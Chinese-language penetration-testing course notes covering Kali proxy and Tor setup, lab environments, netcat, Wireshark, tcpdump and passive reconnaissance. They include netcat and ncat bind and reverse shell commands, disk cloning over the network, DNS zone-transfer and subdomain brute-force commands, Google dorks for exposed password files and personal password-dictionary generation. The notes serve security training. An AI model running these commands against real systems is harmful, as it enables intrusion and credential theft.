<p>currentMode&#x3D;$(cat &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;laptop_mode)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if [ $currentMode -eq 0 ]</span><br><span class="line">then</span><br><span class="line">echo &quot;5&quot; &gt; /proc/sys/vm/laptop_mode</span><br><span class="line">echo &quot;Laptop Mode Enabled&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;0&quot; &gt; /proc/sys/vm/laptop_mode</span><br><span class="line">echo &quot;Laptop Mode Disabled&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h2 id="服务开关"><a href="#服务开关" class="headerlink" title="服务开关"></a>服务开关</h2><ul>
<li>Kali Linux默认未启动所有⺴⽹网络服务</li>
<li>update-rc.d ssh default</li>
<li>&#x2F;etc&#x2F;init.d&#x2F;ssh start</li>
</ul>
<h2 id="翻墙-amp-代理"><a href="#翻墙-amp-代理" class="headerlink" title="翻墙 &amp; 代理"></a>翻墙 &amp; 代理</h2><ul>
<li>GFW⻓长城防⽕火墙<ul>
<li>Facebook、youtube</li>
</ul>
</li>
<li>翻墙<ul>
<li>http代理</li>
<li>socks代理</li>
<li>ssh隧道</li>
</ul>
</li>
<li>Goagent</li>
<li>Tor</li>
<li>⽆无界</li>
</ul>
<h2 id="•-GOAGENT"><a href="#•-GOAGENT" class="headerlink" title="• GOAGENT"></a>• GOAGENT</h2><ul>
<li><a target="_blank" rel="noopener" href="https://code.google.com/p/goagent/">https://code.google.com/p/goagent/</a><ul>
<li>注册：appengine.google.com</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/goagent/goagent">https://github.com/goagent/goagent</a></li>
</ul>
<h2 id="•-GOAGENT安装"><a href="#•-GOAGENT安装" class="headerlink" title="• GOAGENT安装"></a>• GOAGENT安装</h2><ul>
<li>pip install pyOpenSSL</li>
<li>pip install gevent –upgrade</li>
<li>mkdir -p ~&#x2F;.pki&#x2F;nssdb</li>
<li>certutil -d sql:$HOME&#x2F;.pki&#x2F;nssdb –N</li>
<li>导⼊入证书</li>
<li>设置浏览器代理</li>
<li>使⽤用</li>
</ul>
<h2 id="代理链"><a href="#代理链" class="headerlink" title="代理链"></a>代理链</h2><ul>
<li>公开的代理服务器</li>
<li>配置代理链<ul>
<li>vi &#x2F;etc&#x2F;proxychains.conf</li>
</ul>
</li>
<li><h1 id="proxychains-iceweasel"><a href="#proxychains-iceweasel" class="headerlink" title="proxychains iceweasel"></a>proxychains iceweasel</h1></li>
</ul>
<h2 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h2><ul>
<li>&#x2F;etc&#x2F;apt&#x2F;apt.conf<ul>
<li>Acquire::ftp::proxy “<a href="ftp://127.0.0.1:8087/&quot;">ftp://127.0.0.1:8087/&quot;</a>;</li>
<li>Acquire::http::proxy “<a target="_blank" rel="noopener" href="http://127.0.0.1:8087/&quot;">http://127.0.0.1:8087/&quot;</a>;</li>
<li>Acquire::https::proxy “<a target="_blank" rel="noopener" href="https://127.0.0.1:8087/&quot;">https://127.0.0.1:8087/&quot;</a>;</li>
<li>Acquire::socks::proxy “<a target="_blank" rel="noopener" href="https://127.0.0.1:8087/&quot;">https://127.0.0.1:8087/&quot;</a>;</li>
</ul>
</li>
<li>&#x2F;etc&#x2F;bash.bashrc<ul>
<li>export ftp_proxy&#x3D;”<a href="ftp://user:password@proxyIP:port&quot;">ftp://user:password@proxyIP:port&quot;</a></li>
<li>export http_proxy&#x3D;”<a href="http://user:password@proxyIP:port&quot;">http://user:password@proxyIP:port&quot;</a></li>
<li>export https_proxy&#x3D;”<a href="https://user:password@proxyIP:port&quot;">https://user:password@proxyIP:port&quot;</a></li>
<li>export socks_proxy&#x3D;”<a href="https://user:password@proxyIP:port&quot;">https://user:password@proxyIP:port&quot;</a></li>
</ul>
</li>
</ul>
<h2 id="TOR"><a href="#TOR" class="headerlink" title="TOR"></a>TOR</h2><ul>
<li>保护隐私防⽌止被追踪</li>
<li>志愿者组成</li>
<li>长期在天朝完全⽆无法使⽤用<ul>
<li>感谢 云</li>
</ul>
</li>
<li>暗⺴⽹网<ul>
<li>互联网搜索引擎⽆无法发现</li>
<li>互联网⿊黑市</li>
</ul>
</li>
<li>下载和看视频是不道德的行为</li>
</ul>
<h2 id="TOR-1"><a href="#TOR-1" class="headerlink" title="TOR"></a>TOR</h2><ul>
<li>下载<ul>
<li><a target="_blank" rel="noopener" href="https://www.torproject.org/download/download-easy.html.en#linux">https://www.torproject.org/download/download-easy.html.en#linux</a></li>
</ul>
</li>
<li>问题 1 ：should not be run as root;</li>
<li>问题 2 ：服务启动错误</li>
</ul>
<h1 id="Q-amp-A-1"><a href="#Q-amp-A-1" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h1><h1 id="第四章-实验环境"><a href="#第四章-实验环境" class="headerlink" title="第四章 实验环境"></a>第四章 实验环境</h1><h4 id="准备实验环境"><a href="#准备实验环境" class="headerlink" title="准备实验环境"></a>准备实验环境</h4><ul>
<li>渗透⾮非授权系统的弊端</li>
<li>搭建⾃自⼰己的实验环境</li>
</ul>
<h4 id="安装虚拟机"><a href="#安装虚拟机" class="headerlink" title="安装虚拟机"></a>安装虚拟机</h4><ul>
<li>微软最新版软件<ul>
<li><a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-ca/subscriptions/aa">http://msdn.microsoft.com/en-ca/subscriptions/aa</a></li>
</ul>
</li>
<li>Windows虚拟机<ul>
<li><a target="_blank" rel="noopener" href="http://dev.modern.ie/tools/vms/">http://dev.modern.ie/tools/vms/</a></li>
</ul>
</li>
<li>安装⾃自⼰己的虚拟机<ul>
<li>Xp</li>
<li>Win</li>
<li>2003</li>
</ul>
</li>
</ul>
<h4 id="安装虚拟机-1"><a href="#安装虚拟机-1" class="headerlink" title="安装虚拟机"></a>安装虚拟机</h4><ul>
<li>Linux虚拟机<ul>
<li>Ubuntu<ul>
<li>Lamp安装</li>
</ul>
</li>
</ul>
</li>
<li>Metasploitable2<ul>
<li><a target="_blank" rel="noopener" href="http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip">http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip</a></li>
<li>问题：&#x2F;var&#x2F;www&#x2F;mutillidae&#x2F;config.inc<ul>
<li>dbname&#x3D;owasp</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="模拟真实网络"><a href="#模拟真实网络" class="headerlink" title="模拟真实网络"></a>模拟真实网络</h4><ul>
<li>M0n0wall防⽕火墙<ul>
<li><a target="_blank" rel="noopener" href="http://m0n0.ch/wall/downloads.php">http://m0n0.ch/wall/downloads.php</a></li>
</ul>
</li>
</ul>
<h4 id="背靠背防火墙"><a href="#背靠背防火墙" class="headerlink" title="背靠背防火墙"></a>背靠背防火墙</h4><ul>
<li>Pfsense<ul>
<li><a target="_blank" rel="noopener" href="https://pfsense.org/">https://pfsense.org/</a></li>
</ul>
</li>
</ul>
<h1 id="Q-amp-A-2"><a href="#Q-amp-A-2" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h1><h1 id="第五章-基本⼯工具"><a href="#第五章-基本⼯工具" class="headerlink" title="第五章 基本⼯工具"></a>第五章 基本⼯工具</h1><h4 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h4><ul>
<li>Nc &#x2F; ncat</li>
<li>Wireshark</li>
<li>Tcpdump</li>
</ul>
<h4 id="NETCAT-——NC"><a href="#NETCAT-——NC" class="headerlink" title="NETCAT ——NC"></a>NETCAT ——NC</h4><h5 id="•-网络工具中的瑞士军刀——小身材、大智慧"><a href="#•-网络工具中的瑞士军刀——小身材、大智慧" class="headerlink" title="• 网络工具中的瑞士军刀——小身材、大智慧"></a>• 网络工具中的瑞士军刀——小身材、大智慧</h5><h5 id="•-侦听模式-x2F-传输模式"><a href="#•-侦听模式-x2F-传输模式" class="headerlink" title="• 侦听模式 &#x2F; 传输模式"></a>• 侦听模式 &#x2F; 传输模式</h5><ul>
<li>telnet &#x2F; 获取banner信息</li>
<li>传输⽂文本信息</li>
<li>传输⽂文件&#x2F;目录</li>
<li>加密传输⽂文件</li>
<li>远程控制&#x2F;木⻢</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<h4 id="NC——TELNET-x2F-BANNER"><a href="#NC——TELNET-x2F-BANNER" class="headerlink" title="NC——TELNET &#x2F; BANNER"></a>NC——TELNET &#x2F; BANNER</h4><ul>
<li>nc –nv 1.1.1.1 110</li>
<li>nc –nv 1.1.1.1 25</li>
<li>nc –nv 1.1.1.1 80</li>
</ul>
<h4 id="NC——-传输文本信息"><a href="#NC——-传输文本信息" class="headerlink" title="NC—— 传输文本信息"></a>NC—— 传输文本信息</h4><ul>
<li>A：nc -l -p 4444</li>
<li>B：nc –nv 1.1.1.1 4444</li>
<li>远程电子取证信息收集</li>
</ul>
<h4 id="NC——-传输⽂文件-x2F-目录"><a href="#NC——-传输⽂文件-x2F-目录" class="headerlink" title="NC—— 传输⽂文件 &#x2F; 目录"></a>NC—— 传输⽂文件 &#x2F; 目录</h4><h5 id="•-传输⽂文件"><a href="#•-传输⽂文件" class="headerlink" title="• 传输⽂文件"></a>• 传输⽂文件</h5><ul>
<li>A：nc -lp 333 &gt; 1.mp</li>
<li>B：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1</li>
<li>或</li>
<li>A：nc -q 1 -lp 333 &lt; a.mp</li>
<li>B： nc -nv 1.1.1.1 333 &gt; 2.mp</li>
<li>传输目录</li>
<li>A：tar -cvf - music&#x2F; | nc -lp 333 –q 1</li>
<li>B：nc -nv 1.1.1.1 333 | tar -xvf –</li>
<li>加密传⽂文件</li>
<li>A：nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp</li>
<li>B： mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</li>
</ul>
<h4 id="NC——-流媒体服务"><a href="#NC——-流媒体服务" class="headerlink" title="NC—— 流媒体服务"></a>NC—— 流媒体服务</h4><ul>
<li>A： cat 1.mp4 | nc -lp 333</li>
<li>B： 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</li>
</ul>
<h4 id="NC——-端口扫描"><a href="#NC——-端口扫描" class="headerlink" title="NC—— 端口扫描"></a>NC—— 端口扫描</h4><ul>
<li>nc -nvz 1.1.1.1 1-65535</li>
<li>nc –vnzu 1.1.1.1 1-1024</li>
</ul>
<h4 id="NC——-远程克隆硬盘"><a href="#NC——-远程克隆硬盘" class="headerlink" title="NC—— 远程克隆硬盘"></a>NC—— 远程克隆硬盘</h4><ul>
<li>A： nc -lp 333 | dd of&#x3D;&#x2F;dev&#x2F;sda</li>
<li>B： dd if&#x3D;&#x2F;dev&#x2F;sda | nc -nv 1.1.1.1 333 –q 1</li>
<li>远程电⼦子取证，可以将⺫⽬目标服务器硬盘远程复制，或者内存。</li>
</ul>
<h4 id="NC——-远程控制"><a href="#NC——-远程控制" class="headerlink" title="NC—— 远程控制"></a>NC—— 远程控制</h4><h5 id="•-正向："><a href="#•-正向：" class="headerlink" title="• 正向："></a>• 正向：</h5><ul>
<li>A：nc -lp 333 -c bash</li>
<li>B：nc 1.1.1.1 333</li>
<li>反向：</li>
<li>A：nc -lp 333</li>
<li>B：nc 1.1.1.1 333 -c bash</li>
<li>注：Windows⽤用户把bash改成cmd；</li>
</ul>
<h4 id="NC——NCAT"><a href="#NC——NCAT" class="headerlink" title="NC——NCAT"></a>NC——NCAT</h4><ul>
<li>Nc缺乏加密和⾝身份验证的能⼒力</li>
<li>Ncat包含于nmap⼯工具包中</li>
<li>A：ncat ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</li>
<li>B：ncat -nv 1.1.1.1 333 –ssl</li>
</ul>
<h4 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h4><h5 id="•-抓包嗅探协议分析"><a href="#•-抓包嗅探协议分析" class="headerlink" title="• 抓包嗅探协议分析"></a>• 抓包嗅探协议分析</h5><h5 id="•-安全专家必备的技能"><a href="#•-安全专家必备的技能" class="headerlink" title="• 安全专家必备的技能"></a>• 安全专家必备的技能</h5><h5 id="•-抓包引擎"><a href="#•-抓包引擎" class="headerlink" title="• 抓包引擎"></a>• 抓包引擎</h5><ul>
<li>Libpcap9—— Linux</li>
<li>Winpcap10—— Windows</li>
<li>解码能力</li>
</ul>
<h4 id="WIRESHARK——-基本使用方法"><a href="#WIRESHARK——-基本使用方法" class="headerlink" title="WIRESHARK—— 基本使用方法"></a>WIRESHARK—— 基本使用方法</h4><h5 id="•-启动"><a href="#•-启动" class="headerlink" title="• 启动"></a>• 启动</h5><h5 id="•-选择抓包⺴⽹网卡"><a href="#•-选择抓包⺴⽹网卡" class="headerlink" title="• 选择抓包⺴⽹网卡"></a>• 选择抓包⺴⽹网卡</h5><h5 id="•-混杂模式"><a href="#•-混杂模式" class="headerlink" title="• 混杂模式"></a>• 混杂模式</h5><h5 id="•-实时抓包"><a href="#•-实时抓包" class="headerlink" title="• 实时抓包"></a>• 实时抓包</h5><h5 id="•-保存和分析捕获⽂文件"><a href="#•-保存和分析捕获⽂文件" class="headerlink" title="• 保存和分析捕获⽂文件"></a>• 保存和分析捕获⽂文件</h5><h5 id="•-⾸首选项"><a href="#•-⾸首选项" class="headerlink" title="• ⾸首选项"></a>• ⾸首选项</h5><h4 id="WIRESHARK——-筛选器"><a href="#WIRESHARK——-筛选器" class="headerlink" title="WIRESHARK—— 筛选器"></a>WIRESHARK—— 筛选器</h4><h5 id="•-过滤掉干扰的数据包"><a href="#•-过滤掉干扰的数据包" class="headerlink" title="• 过滤掉干扰的数据包"></a>• 过滤掉干扰的数据包</h5><h5 id="•-抓包筛选器"><a href="#•-抓包筛选器" class="headerlink" title="• 抓包筛选器"></a>• 抓包筛选器</h5><h5 id="•-显⽰示筛选器"><a href="#•-显⽰示筛选器" class="headerlink" title="• 显⽰示筛选器"></a>• 显⽰示筛选器</h5><h4 id="WIRESHARK——-常⻅见协议包"><a href="#WIRESHARK——-常⻅见协议包" class="headerlink" title="WIRESHARK—— 常⻅见协议包"></a>WIRESHARK—— 常⻅见协议包</h4><h5 id="•-数据包的分层结构"><a href="#•-数据包的分层结构" class="headerlink" title="• 数据包的分层结构"></a>• 数据包的分层结构</h5><ul>
<li>Arp</li>
<li>Icmp</li>
<li>Tcp——三次握⼿手</li>
<li>Udp</li>
<li>Dns</li>
<li>http</li>
<li>ftp</li>
</ul>
<h4 id="WIRESHARK——TCP"><a href="#WIRESHARK——TCP" class="headerlink" title="WIRESHARK——TCP"></a>WIRESHARK——TCP</h4><h5 id="•-数据流"><a href="#•-数据流" class="headerlink" title="• 数据流"></a>• 数据流</h5><ul>
<li>http</li>
<li>Smtp</li>
<li>Pop</li>
<li>Ssl</li>
</ul>
<h4 id="WIRESHARK——-信息统计"><a href="#WIRESHARK——-信息统计" class="headerlink" title="WIRESHARK—— 信息统计"></a>WIRESHARK—— 信息统计</h4><h5 id="•-节点数"><a href="#•-节点数" class="headerlink" title="• 节点数"></a>• 节点数</h5><h5 id="•-协议分布"><a href="#•-协议分布" class="headerlink" title="• 协议分布"></a>• 协议分布</h5><h5 id="•-包大小分布"><a href="#•-包大小分布" class="headerlink" title="• 包大小分布"></a>• 包大小分布</h5><h5 id="•-会话连接"><a href="#•-会话连接" class="headerlink" title="• 会话连接"></a>• 会话连接</h5><h5 id="•-解码方式"><a href="#•-解码方式" class="headerlink" title="• 解码方式"></a>• 解码方式</h5><h5 id="•-专家系统"><a href="#•-专家系统" class="headerlink" title="• 专家系统"></a>• 专家系统</h5><ul>
<li>抓包对⽐比nc、ncat加密与不加密的流量</li>
</ul>
<h4 id="WIRESHARK——-实践"><a href="#WIRESHARK——-实践" class="headerlink" title="WIRESHARK—— 实践"></a>WIRESHARK—— 实践</h4><ul>
<li>抓包对⽐比nc、ncat加密与不加密的流量</li>
</ul>
<h4 id="WIRESHARK——-实践-1"><a href="#WIRESHARK——-实践-1" class="headerlink" title="WIRESHARK—— 实践"></a>WIRESHARK—— 实践</h4><ul>
<li>抓包对⽐比nc、ncat加密与不加密的流量</li>
<li>企业抓包布署⽅方案</li>
</ul>
<h4 id="TCPDUMP"><a href="#TCPDUMP" class="headerlink" title="TCPDUMP"></a>TCPDUMP</h4><ul>
<li>No-GUI的抓包分析⼯工具</li>
<li>Linux、Unix系统默认安装</li>
</ul>
<h4 id="TCPDUMP——-抓包"><a href="#TCPDUMP——-抓包" class="headerlink" title="TCPDUMP—— 抓包"></a>TCPDUMP—— 抓包</h4><h5 id="•-抓包"><a href="#•-抓包" class="headerlink" title="• 抓包"></a>• 抓包</h5><ul>
<li>tcpdump -i eth0 -s 0 -w file.pcap</li>
<li>读取抓包⽂文件</li>
<li>Tcpdump -r file.pcap</li>
</ul>
<h4 id="TCPDUMP——-筛选"><a href="#TCPDUMP——-筛选" class="headerlink" title="TCPDUMP—— 筛选"></a>TCPDUMP—— 筛选</h4><ul>
<li>tcpdump -n -r http.cap | awk ‘{print $3}’| sort –u</li>
<li>tcpdump -n src host 145.254.160.237 -r http.cap</li>
<li>tcpdump -n dst host 145.254.160.237 -r http.cap</li>
<li>tcpdump -n port 53 -r http.cap</li>
<li>tcpdump -nX port 80 -r http.cap</li>
</ul>
<h4 id="TCPDUMP——-⾼高级筛选"><a href="#TCPDUMP——-⾼高级筛选" class="headerlink" title="TCPDUMP—— ⾼高级筛选"></a>TCPDUMP—— ⾼高级筛选</h4><h4 id="TCPDUMP——-⾼高级筛选-1"><a href="#TCPDUMP——-⾼高级筛选-1" class="headerlink" title="TCPDUMP—— ⾼高级筛选"></a>TCPDUMP—— ⾼高级筛选</h4><ul>
<li>tcpdump -A -n ‘tcp[13] &#x3D; 24’ -r http.cap</li>
</ul>
<h1 id="Q-amp-A-3"><a href="#Q-amp-A-3" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h1><h1 id="第六章-被动信息收集"><a href="#第六章-被动信息收集" class="headerlink" title="第六章 被动信息收集"></a>第六章 被动信息收集</h1><h4 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h4><h5 id="•-公开渠道可获得的信息"><a href="#•-公开渠道可获得的信息" class="headerlink" title="• 公开渠道可获得的信息"></a>• 公开渠道可获得的信息</h5><h5 id="•-与目标系统不产⽣生直接交互"><a href="#•-与目标系统不产⽣生直接交互" class="headerlink" title="• 与目标系统不产⽣生直接交互"></a>• 与目标系统不产⽣生直接交互</h5><h5 id="•-尽量避免留下⼀切痕迹"><a href="#•-尽量避免留下⼀切痕迹" class="headerlink" title="• 尽量避免留下⼀切痕迹"></a>• 尽量避免留下⼀切痕迹</h5><h5 id="•-OSINT："><a href="#•-OSINT：" class="headerlink" title="• OSINT："></a>• OSINT：</h5><ul>
<li>美国军⽅方：<a target="_blank" rel="noopener" href="http://www.fas.org/irp/doddir/army/atp2-22-9.pdf">http://www.fas.org/irp/doddir/army/atp2-22-9.pdf</a></li>
<li>北⼤大⻄西洋公约组织：<a target="_blank" rel="noopener" href="http://information-retrieval.info/docs/NATO-OSINT.html">http://information-retrieval.info/docs/NATO-OSINT.html</a></li>
</ul>
<h4 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h4><h5 id="•-IP地址段"><a href="#•-IP地址段" class="headerlink" title="• IP地址段"></a>• IP地址段</h5><h5 id="•-域名信息"><a href="#•-域名信息" class="headerlink" title="• 域名信息"></a>• 域名信息</h5><h5 id="•-邮件地址"><a href="#•-邮件地址" class="headerlink" title="• 邮件地址"></a>• 邮件地址</h5><h5 id="•-⽂文档图片数据"><a href="#•-⽂文档图片数据" class="headerlink" title="• ⽂文档图片数据"></a>• ⽂文档图片数据</h5><h5 id="•-公司地址"><a href="#•-公司地址" class="headerlink" title="• 公司地址"></a>• 公司地址</h5><h5 id="•-公司组织架构"><a href="#•-公司组织架构" class="headerlink" title="• 公司组织架构"></a>• 公司组织架构</h5><h5 id="•-联系电话-x2F-传真号码"><a href="#•-联系电话-x2F-传真号码" class="headerlink" title="• 联系电话 &#x2F; 传真号码"></a>• 联系电话 &#x2F; 传真号码</h5><h5 id="•-人员姓名-x2F-职务"><a href="#•-人员姓名-x2F-职务" class="headerlink" title="• 人员姓名 &#x2F; 职务"></a>• 人员姓名 &#x2F; 职务</h5><h5 id="•-目标系统使⽤用的技术架构"><a href="#•-目标系统使⽤用的技术架构" class="headerlink" title="• 目标系统使⽤用的技术架构"></a>• 目标系统使⽤用的技术架构</h5><h5 id="•-公开的商业信息"><a href="#•-公开的商业信息" class="headerlink" title="• 公开的商业信息"></a>• 公开的商业信息</h5><h4 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h4><h5 id="•-用信息描述目标"><a href="#•-用信息描述目标" class="headerlink" title="• 用信息描述目标"></a>• 用信息描述目标</h5><h5 id="•-发现"><a href="#•-发现" class="headerlink" title="• 发现"></a>• 发现</h5><h5 id="•-社会工程学攻击"><a href="#•-社会工程学攻击" class="headerlink" title="• 社会工程学攻击"></a>• 社会工程学攻击</h5><h5 id="•-物理缺口"><a href="#•-物理缺口" class="headerlink" title="• 物理缺口"></a>• 物理缺口</h5><h4 id="信息收集-——DNS"><a href="#信息收集-——DNS" class="headerlink" title="信息收集 ——DNS"></a>信息收集 ——DNS</h4><h5 id="•-域名解析成IP地址"><a href="#•-域名解析成IP地址" class="headerlink" title="• 域名解析成IP地址"></a>• 域名解析成IP地址</h5><ul>
<li>域名 与 FQDN的区别</li>
<li>域名记录：A 、C nmae、NS、MX、ptr</li>
</ul>
<h4 id="DNS-信息收集-——-NSLOOKUP"><a href="#DNS-信息收集-——-NSLOOKUP" class="headerlink" title="DNS 信息收集 —— NSLOOKUP"></a>DNS 信息收集 —— NSLOOKUP</h4><ul>
<li>nslookup <a target="_blank" rel="noopener" href="http://www.sina.com/">http://www.sina.com</a></li>
<li>server</li>
<li>type&#x3D;a、mx、ns、any</li>
<li>nslookup -type&#x3D;ns example.com 156.154.70.22</li>
</ul>
<h4 id="DNS-信息收集-——-DIG"><a href="#DNS-信息收集-——-DIG" class="headerlink" title="DNS 信息收集 —— DIG"></a>DNS 信息收集 —— DIG</h4><ul>
<li>dig @8.8.8.8 <a target="_blank" rel="noopener" href="http://www.sina.com/">http://www.sina.com</a> mx</li>
<li>dig <a target="_blank" rel="noopener" href="http://www.sina.com/">http://www.sina.com</a> any</li>
<li>反向查询：dig +noall +answer -x 8.8.8.8</li>
<li>bind版本信息： dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</li>
<li>DNS追踪： dig +trace example.com<ul>
<li>抓包比较递归查询、迭代查询过程的区别</li>
</ul>
</li>
</ul>
<h4 id="DNS-区域传输"><a href="#DNS-区域传输" class="headerlink" title="DNS 区域传输"></a>DNS 区域传输</h4><ul>
<li>dig @ns1.example.com example.com axfr</li>
<li>host -T -l sina.com 8.8.8.</li>
</ul>
<h4 id="DNS-字典爆破"><a href="#DNS-字典爆破" class="headerlink" title="DNS 字典爆破"></a>DNS 字典爆破</h4><ul>
<li>fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt</li>
<li>dnsdict6 -d4 -t 16 -x sina.com</li>
<li>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</li>
<li>dnsmap sina.com -w dns.txt</li>
<li>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</li>
<li>dnsrecon -t std -d sina.com</li>
</ul>
<h4 id="DNS-注册信息"><a href="#DNS-注册信息" class="headerlink" title="DNS 注册信息"></a>DNS 注册信息</h4><ul>
<li>Whois</li>
<li>whois -h whois.apnic.net 192.0.43.10</li>
</ul>
<h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><h5 id="•-公司新闻动态"><a href="#•-公司新闻动态" class="headerlink" title="• 公司新闻动态"></a>• 公司新闻动态</h5><h5 id="•-重要雇员信息"><a href="#•-重要雇员信息" class="headerlink" title="• 重要雇员信息"></a>• 重要雇员信息</h5><h5 id="•-机密文档-x2F-网络拓扑"><a href="#•-机密文档-x2F-网络拓扑" class="headerlink" title="• 机密文档 &#x2F; 网络拓扑"></a>• 机密文档 &#x2F; 网络拓扑</h5><h5 id="•-用户名密码"><a href="#•-用户名密码" class="headerlink" title="• 用户名密码"></a>• 用户名密码</h5><h5 id="•-目标系统软硬件技术架构"><a href="#•-目标系统软硬件技术架构" class="headerlink" title="• 目标系统软硬件技术架构"></a>• 目标系统软硬件技术架构</h5><h4 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h4><h5 id="•-搜索联网的设备"><a href="#•-搜索联网的设备" class="headerlink" title="• 搜索联网的设备"></a>• 搜索联网的设备</h5><ul>
<li>Banner：http、ftp、ssh、telnet</li>
<li><a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a><ul>
<li><a target="_blank" rel="noopener" href="http://1.179.177.109:81/index.htm">http://1.179.177.109:81/index.htm</a></li>
</ul>
</li>
<li>常⻅见filter：<ul>
<li>net （192.168.20.1）</li>
<li>city</li>
<li>country（CN、US）</li>
<li>port（ 80 、 21 、 22 、 23 ）</li>
<li>os</li>
<li>Hostname（主机或域名）</li>
</ul>
</li>
</ul>
<h4 id="GOOGLE搜索"><a href="#GOOGLE搜索" class="headerlink" title="GOOGLE搜索"></a>GOOGLE搜索</h4><ul>
<li>+充值 - ⽀支付</li>
<li>北京的电⼦子商务公司——北京 intitle:电⼦子商务 intext:法⼈人 intext:电话</li>
<li>阿⾥里网站上的北京公司联系⼈人——北京 site:alibaba.com inurl:contact</li>
<li>塞班司法案的PDF⽂文档——SOX filetype:pdf</li>
<li>法国的支付相关⻚页⾯面——payment site:fr</li>
</ul>
<h4 id="GOOGLE搜索——实例"><a href="#GOOGLE搜索——实例" class="headerlink" title="GOOGLE搜索——实例"></a>GOOGLE搜索——实例</h4><ul>
<li>inurl:”level&#x2F;15&#x2F;exec&#x2F;-&#x2F;show”</li>
<li>intitle:”netbotz appliance” “ok”</li>
<li>inurl &#x2F;admin&#x2F;login.php</li>
<li>inurl:qq.txt</li>
<li>filetype:xls “username | password“</li>
<li>inurl:ftp “password” filetype:xls site:baidu.com</li>
<li>Service.pwd</li>
<li><a target="_blank" rel="noopener" href="http://exploit-db.com/google-dorks">http://exploit-db.com/google-dorks</a></li>
</ul>
<h4 id="YA-N-D-E-X"><a href="#YA-N-D-E-X" class="headerlink" title="YA N D E X"></a>YA N D E X</h4><h5 id="•-世界第四大搜索引擎——俄罗斯"><a href="#•-世界第四大搜索引擎——俄罗斯" class="headerlink" title="• 世界第四大搜索引擎——俄罗斯"></a>• 世界第四大搜索引擎——俄罗斯</h5><ul>
<li><a target="_blank" rel="noopener" href="https://www.yandex.com/">https://www.yandex.com/</a></li>
</ul>
<h4 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h4><ul>
<li>全特性的web侦察框架</li>
<li>基于Python开发</li>
</ul>
<h4 id="⽤用户信息"><a href="#⽤用户信息" class="headerlink" title="⽤用户信息"></a>⽤用户信息</h4><h5 id="•-邮件"><a href="#•-邮件" class="headerlink" title="• 邮件"></a>• 邮件</h5><ul>
<li>theharvester -d sina.com -l 300 -b google</li>
<li>⽂文件</li>
<li>metagoofil -d microsoft.com -t pdf -l 200 -o test -f 1.html</li>
</ul>
<h4 id="MELTAGO"><a href="#MELTAGO" class="headerlink" title="MELTAGO"></a>MELTAGO</h4><h5 id="•-申请账号"><a href="#•-申请账号" class="headerlink" title="• 申请账号"></a>• 申请账号</h5><h5 id="•-登陆使用"><a href="#•-登陆使用" class="headerlink" title="• 登陆使用"></a>• 登陆使用</h5><h4 id="其他途径"><a href="#其他途径" class="headerlink" title="其他途径"></a>其他途径</h4><h5 id="•-社交网络"><a href="#•-社交网络" class="headerlink" title="• 社交网络"></a>• 社交网络</h5><h5 id="•-⼯工商注册"><a href="#•-⼯工商注册" class="headerlink" title="• ⼯工商注册"></a>• ⼯工商注册</h5><h5 id="•-新闻组-x2F-论坛"><a href="#•-新闻组-x2F-论坛" class="headerlink" title="• 新闻组 &#x2F; 论坛"></a>• 新闻组 &#x2F; 论坛</h5><h5 id="•-招聘网站"><a href="#•-招聘网站" class="headerlink" title="• 招聘网站"></a>• 招聘网站</h5><ul>
<li><a target="_blank" rel="noopener" href="http://www.archive.org/web/web.php">http://www.archive.org/web/web.php</a></li>
</ul>
<h4 id="个人专属的密码字典"><a href="#个人专属的密码字典" class="headerlink" title="个人专属的密码字典"></a>个人专属的密码字典</h4><h5 id="•-按个⼈人信息⽣生成其专属的密码字典"><a href="#•-按个⼈人信息⽣生成其专属的密码字典" class="headerlink" title="• 按个⼈人信息⽣生成其专属的密码字典"></a>• 按个⼈人信息⽣生成其专属的密码字典</h5><ul>
<li>CUPP——Common User Password Profiler<ul>
<li>git clone <a target="_blank" rel="noopener" href="https://github.com/Mebus/cupp.git">https://github.com/Mebus/cupp.git</a></li>
<li>python cup.py -i</li>
</ul>
</li>
</ul>
<h4 id="METADATA"><a href="#METADATA" class="headerlink" title="METADATA"></a>METADATA</h4><ul>
<li>Exif图⽚片信息</li>
<li>Foca</li>
</ul>
